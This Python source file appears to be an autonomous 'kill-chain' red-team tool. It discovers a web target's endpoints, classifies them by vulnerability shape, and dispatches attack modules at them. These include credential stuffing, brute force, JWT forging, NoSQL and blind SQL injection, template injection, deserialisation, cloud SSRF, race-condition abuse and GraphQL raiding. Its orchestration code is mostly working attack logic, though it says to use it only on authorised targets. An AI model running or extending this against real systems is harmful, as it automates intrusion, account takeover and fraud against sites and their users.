#!/usr/bin/env python3
"""
redteam.py — Autonomous chained kill-chain (INTERNAL edition).

Discovers the target's surface, CLASSIFIES each endpoint by the vuln class it's
shaped like (login, template, deserialize sink, url-fetcher, limited action,
GraphQL, injectable param, HTML form), then DISPATCHES the right specialist at
each with args derived from discovery — a whole engagement from one command.

Discovery = a path wordlist (GET + POST-probe) + HTML form/link parsing + JSON
key extraction. Nothing is run against a target you didn't point it at.

    python TOOLS/redteam.py --url http://127.0.0.1:9200/
    python TOOLS/redteam.py --url http://127.0.0.1:8800/ --user demo --pass demo1234
"""
import argparse
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(ROOT, "TOOLS")

# Endpoints worth probing even when nothing links to them (POST-only APIs).
DISCOVERY_PATHS = [
    "/", "/api", "/dashboard", "/account", "/profile", "/search", "/api/search",
    "/login", "/signin", "/api/login", "/auth/login", "/api/auth/login", "/session",
    "/signup", "/register", "/api/register", "/api/signup",
    "/api/user", "/api/users", "/api/me", "/user", "/users",
    "/render", "/api/render", "/preview", "/api/preview", "/api/email", "/api/greet",
    "/api/card", "/api/invoice", "/api/report", "/template", "/api/template",
    "/api/session/load", "/api/load", "/api/import", "/api/restore", "/api/deserialize",
    "/api/state", "/api/resume", "/api/object",
    "/api/fetch", "/fetch", "/api/proxy", "/proxy", "/api/image", "/api/webhook", "/api/preview-url",
    "/api/coupon/redeem", "/api/redeem", "/api/voucher", "/api/promo", "/api/gift",
    "/api/vote", "/api/like", "/api/claim", "/api/transfer", "/api/withdraw",
    "/api/purchase", "/api/checkout", "/api/apply", "/api/refer", "/api/invite",
    "/graphql", "/api/graphql", "/query", "/v1/graphql",
    "/api/config", "/api/admin", "/admin", "/api/orders", "/api/cart",
]

LOGIN_HINTS = ("/login", "/signin", "/api/login", "/auth/login", "/api/auth/login",
               "/session", "/api/session", "/api/auth")
URL_PARAM_NAMES = {"url", "uri", "target", "dest", "destination", "redirect", "next",
                   "fetch", "callback", "webhook", "image", "img", "src", "proxy", "u", "link", "feed"}
TEMPLATE_PATH = ("render", "template", "preview", "email", "greet", "card", "invoice", "report", "message")
TEMPLATE_FIELDS = ("template", "tpl", "content", "body", "message", "name", "subject", "html", "text")
DESERIAL_PATH = ("load", "session", "restore", "import", "deserialize", "unserialize",
                 "state", "resume", "object", "cache", "cookie")
DESERIAL_FIELDS = ("data", "payload", "state", "session", "object", "serialized", "blob", "token", "cookie")
FETCH_PATH = ("fetch", "proxy", "image", "webhook", "preview-url", "avatar", "thumbnail", "screenshot")
ACTION_PATH = ("redeem", "coupon", "voucher", "promo", "gift", "vote", "like", "claim",
               "transfer", "withdraw", "purchase", "buy", "checkout", "apply", "refer",
               "invite", "follow", "upvote", "reward", "cashout")

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")
FORM_RE = re.compile(r"<form\b(.*?)</form>", re.I | re.S)
ACTION_RE = re.compile(r'action\s*=\s*["\']([^"\']+)["\']', re.I)
METHOD_RE = re.compile(r'method\s*=\s*["\']([^"\']+)["\']', re.I)
INPUT_RE = re.compile(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
LINK_RE = re.compile(r'(?:href|action|src)\s*=\s*["\']([^"\'#]+)["\']', re.I)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class RedTeam(VibeTool):
    def __init__(self, base):
        super().__init__("RedTeam", "Autonomous Chained Kill-Chain")
        self.base = base.rstrip("/")
        self.results = []
        self.ep = {}       # path -> {methods,status,ctype,fields,params,classes}
        self.graphql = ""

    # -- HTTP ---------------------------------------------------------------
    def _req(self, path, method="GET", data=None, ctype=None):
        h = {"User-Agent": privacy_user_agent("RedTeam"), "Accept": "text/html,application/json,*/*"}
        body = None
        if data is not None:
            body = data if isinstance(data, bytes) else data.encode()
            h["Content-Type"] = ctype or "application/json"
        try:
            op = urllib.request.build_opener(_NoRedirect())
            req = urllib.request.Request(self.base + path, data=body, method=method, headers=h)
            with op.open(req, timeout=7) as r:
                return r.getcode(), r.read(60000).decode("utf-8", "replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read(60000).decode("utf-8", "replace"), e.headers
        except Exception:
            return 0, "", None

    # -- discovery ----------------------------------------------------------
    def _reg(self, path):
        return self.ep.setdefault(path, {"methods": set(), "status": {}, "ctype": "",
                                         "fields": set(), "params": set(), "classes": set()})

    def _exists(self, path):
        """True if the endpoint responded with anything other than 404 (a real
        route), so we don't dispatch specialists at path-shaped 404s."""
        st = self.ep.get(path, {}).get("status", {})
        return any(s not in (0, 404) for s in st.values()) if st else False

    def _parse_html(self, page_path, body):
        for m in FORM_RE.finditer(body):
            whole = m.group(0)
            names = INPUT_RE.findall(whole)
            am = ACTION_RE.search(whole[:300])
            action = am.group(1) if am else page_path
            action = urllib.parse.urljoin(self.base + page_path, action)
            ap = urllib.parse.urlparse(action).path or page_path
            mm = METHOD_RE.search(whole[:300])
            e = self._reg(ap)
            e["methods"].add((mm.group(1).upper() if mm else "POST"))
            e["fields"].update(n.lower() for n in names)
        for href in LINK_RE.findall(body):
            pr = urllib.parse.urlparse(urllib.parse.urljoin(self.base + page_path, href))
            if pr.query:
                e = self._reg(pr.path or "/")
                e["params"].update(k.lower() for k in urllib.parse.parse_qs(pr.query))

    def _classify(self, path, e):
        segs = path.lower().strip("/").split("/")
        p = path.lower()
        if p in LOGIN_HINTS or "password" in e["fields"] or any(h in p for h in ("login", "signin")):
            e["classes"].add("login")
        if any(h in s for s in segs for h in TEMPLATE_PATH) or (e["fields"] & set(TEMPLATE_FIELDS)):
            e["classes"].add("template")
        if any(h in s for s in segs for h in DESERIAL_PATH) or (e["fields"] & set(DESERIAL_FIELDS)):
            e["classes"].add("deserialize")
        if any(h in s for s in segs for h in FETCH_PATH) or (e["params"] & URL_PARAM_NAMES):
            e["classes"].add("fetch")
        if any(h in s for s in segs for h in ACTION_PATH):
            e["classes"].add("action")

    def discover(self):
        self.log("=== PHASE 1: DISCOVERY ===")
        for path in DISCOVERY_PATHS:
            st, body, hdr = self._req(path)
            if st == 0:
                continue
            e = self._reg(path)
            e["methods"].add("GET"); e["status"]["GET"] = st
            try:
                e["ctype"] = (hdr.get("Content-Type") or "").lower()
            except Exception:
                pass
            if "html" in e["ctype"] or "<form" in body.lower() or "<a " in body.lower():
                self._parse_html(path, body)
            if "json" in e["ctype"]:
                e["fields"].update(k.lower() for k in re.findall(r'"([A-Za-z_][A-Za-z0-9_]{0,30})"\s*:', body))
            # POST-probe API-ish endpoints GET can't exercise.
            if ("/api" in path or path in ("/graphql", "/query")) and st in (404, 405, 400, 200):
                pst, pbody, _ = self._req(path, "POST", json.dumps({"probe": "1"}))
                if pst not in (0, 404):
                    e["methods"].add("POST"); e["status"]["POST"] = pst
                    if pst < 500:
                        e["fields"].update(k.lower() for k in re.findall(r'"([A-Za-z_][A-Za-z0-9_]{0,30})"\s*:', pbody))
        for gp in ("/graphql", "/api/graphql", "/query", "/v1/graphql"):
            st, body, _ = self._req(gp, "POST", '{"query":"{__schema{types{name}}}"}')
            if st and ("__schema" in body or '"data"' in body or '"errors"' in body):
                self.graphql = gp
                break
        for path, e in list(self.ep.items()):
            self._classify(path, e)

        live = [p for p, e in self.ep.items() if self._exists(p)]
        def has(c): return [p for p in live if c in self.ep[p]["classes"]]
        self.log(f"{len(live)} live endpoint(s) (of {len(self.ep)} probed). "
                 f"login={has('login')} template={has('template')} deserialize={has('deserialize')} "
                 f"fetch={has('fetch')} action={has('action')} graphql={self.graphql or '-'}")

    # -- dispatch -----------------------------------------------------------
    def _run_tool(self, tool, args, phase, label=None):
        label = label or tool
        self.log(f"→ {label}")
        sys.stdout.flush()
        try:
            p = subprocess.run([sys.executable, os.path.join(TOOLS, f"{tool}.py"), *args],
                               cwd=ROOT, capture_output=True, text=True, timeout=150)
            out = (p.stdout or "") + (p.stderr or "")
        except subprocess.TimeoutExpired:
            out = "[timeout]"
        hacks, crits = out.count("🔥 HACK"), out.count("🔴 CRITICAL")
        self.results.append((phase, label, hacks, crits))
        self.log(f"   {label}: {hacks} hack / {crits} crit", "hack" if hacks else ("crit" if crits else "pass"))

    def _pick(self, e, options, default):
        for f in options:
            if f in e["fields"]:
                return f
        return default

    def run(self, user, password, user_field):
        self.banner()
        self.log(f"Autonomous engagement: {self.base}")
        self.discover()

        # Prefer login endpoints that actually responded (not a 404 path-shape).
        login_eps = [p for p in self.ep if "login" in self.ep[p]["classes"]
                     and any(s not in (0, 404) for s in self.ep[p]["status"].values())]
        if not login_eps:
            login_eps = [p for p in self.ep if "login" in self.ep[p]["classes"]]
        login = login_eps[0] if login_eps else ""
        jwt = False
        if user and password:
            for lp in login_eps + list(LOGIN_HINTS):
                if not lp:
                    continue
                st, body, hdr = self._req(lp, "POST", json.dumps({user_field: user, "password": password}))
                if JWT_RE.search(body) or (hdr and JWT_RE.search(hdr.get("Set-Cookie") or "")):
                    login, jwt = lp, True
                    self.log(f"POST-login: {lp} issues a JWT (login confirmed)")
                    break
                if st in (200, 302, 303):
                    login = lp
                    break

        # Phase 2 — always-on surface hits.
        self.log("=== PHASE 2: SURFACE ===")
        self._run_tool("vibe_headers", ["--url", self.base + "/"], "surface")
        self._run_tool("key_stealer", ["--url", self.base + "/"], "surface")

        # Phase 3 — auth.
        self.log("=== PHASE 3: AUTH ===")
        if login:
            self._run_tool("intruder", ["--url", self.base + "/", "--login", login,
                                        "--user-field", user_field], "auth")
            for lp in login_eps[:2]:
                self._run_tool("nosqli", ["--url", self.base + lp, "--user-field", user_field,
                                          "--user", user or "admin"], "auth", label=f"nosqli({lp})")
            if user:
                self._run_tool("credstuff", ["--url", self.base + "/", "--login", login,
                                             "--user", user, "--user-field", user_field], "auth")
            if jwt and user:
                protected = next((p for p in ("/api/admin", "/admin", "/api/me", "/account") if p in self.ep), "/api/admin")
                self._run_tool("jwt_forge", ["--url", self.base + "/", "--login", login, "--user", user,
                                            "--pass", password, "--user-field", user_field,
                                            "--protected", protected], "auth")
        else:
            self.log("   (no login surface)")

        # Phase 4 — class-routed specialists.
        self.log("=== PHASE 4: CLASS-ROUTED EXPLOITATION ===")
        def take(c, n=2):
            return [p for p, e in self.ep.items() if c in e["classes"] and self._exists(p)][:n]

        for path in take("template"):
            self._run_tool("ssti", ["--url", self.base + path, "--field",
                                     self._pick(self.ep[path], TEMPLATE_FIELDS, "template"), "--method", "POST"],
                           "inject", label=f"ssti({path})")
        for path in take("deserialize"):
            self._run_tool("deserial", ["--url", self.base + "/", "--endpoint", path, "--field",
                                        self._pick(self.ep[path], DESERIAL_FIELDS, "data")],
                           "inject", label=f"deserial({path})")
        for path in take("fetch"):
            prm = next((p for p in self.ep[path]["params"] if p in URL_PARAM_NAMES), "url")
            self._run_tool("ssrf_cloud", [f"--url", f"{self.base}{path}?{prm}=x", "--param", prm,
                                          "--self", self.base], "ssrf", label=f"ssrf_cloud({path})")
        for path in take("action"):
            fields = self.ep[path]["fields"] - {"csrf", "token"}
            data = json.dumps({f: "rt" for f in list(fields)[:4]}) if fields else ""
            self._run_tool("racer", ["--url", self.base + "/", "--endpoint", path, "--count", "20",
                                      *(["--data", data] if data else []), "--success", "granted"],
                           "race", label=f"racer({path})")
        if self.graphql:
            self._run_tool("graphql_raider", ["--url", self.base + "/", "--endpoint", self.graphql], "graphql")

        # Phase 5 — GET-param SQLi on discovered params.
        tested = 0
        for path, e in self.ep.items():
            for prm in list(e["params"])[:1]:
                if tested >= 3:
                    break
                url = f"{self.base}{path}?{urllib.parse.urlencode({prm: 'test'})}"
                self._run_tool("blind_sqli", ["--url", url, "--param", prm], "inject", label=f"blind_sqli({prm})")
                tested += 1

        # Summary.
        self.log("=" * 52)
        th = sum(r[2] for r in self.results); tc = sum(r[3] for r in self.results)
        self.log(f"ENGAGEMENT COMPLETE — {len(self.results)} tools, {th} hack signal(s), {tc} critical(s)",
                 "hack" if th else "pass")
        for phase, tool, h, c in self.results:
            if h or c:
                self.log(f"  [{phase}] {tool}: {h} hack / {c} crit", "hack" if h else "crit")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="RedTeam - autonomous chained kill-chain")
    p.add_argument("--url", required=True, help="Target base URL you own/are authorized to test")
    p.add_argument("--user", default="", help="A username to use for authed phases")
    p.add_argument("--pass", dest="password", default="", help="Password for --user")
    p.add_argument("--user-field", default="username", help="Login username field name")
    p.add_argument("-v", "--version", action="version", version="RedTeam 2.0.0")
    args = p.parse_args(argv)
    return RedTeam(args.url).run(args.user, args.password, args.user_field)


if __name__ == "__main__":
    sys.exit(main())
